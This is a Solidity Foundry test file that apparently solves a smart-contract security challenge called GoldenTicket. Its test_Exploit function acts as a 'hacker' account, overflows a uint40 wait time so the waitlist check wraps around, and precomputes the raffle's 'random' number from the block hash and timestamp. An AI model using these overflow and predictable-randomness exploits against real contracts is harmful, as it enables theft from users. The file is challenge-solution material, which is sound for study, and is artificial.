// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/GoldenTicket.sol";

contract GoldenTicketTest is Test {
    // the identifiers of the forks
    uint256 polygonFork;

    //Access variables from .env file via vm.envString("varname")
    //Replace ALCHEMY_KEY by your alchemy key or Etherscan key, change RPC url if need
    //inside your .env file e.g:
    string POLYGON_RPC_URL = vm.envString("POLYGON_RPC_URL");

    GoldenTicket goldenTicket;

    address hacker = makeAddr("HACKER");

    function setUp() external {
        polygonFork = vm.createSelectFork(POLYGON_RPC_URL);
        goldenTicket = new GoldenTicket();
    }

    function test_Exploit() external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        vm.startPrank(hacker);
        goldenTicket.joinWaitlist();
        // Make waitlist timestamp overflow to 1.
        uint40 waitTime = uint40(block.timestamp + 10 * 365 days);
        goldenTicket.updateWaitTime(type(uint40).max - waitTime + 2);
        console.log(block.timestamp);
        goldenTicket.joinRaffle(randomNumber);
        vm.stopPrank();
    }
}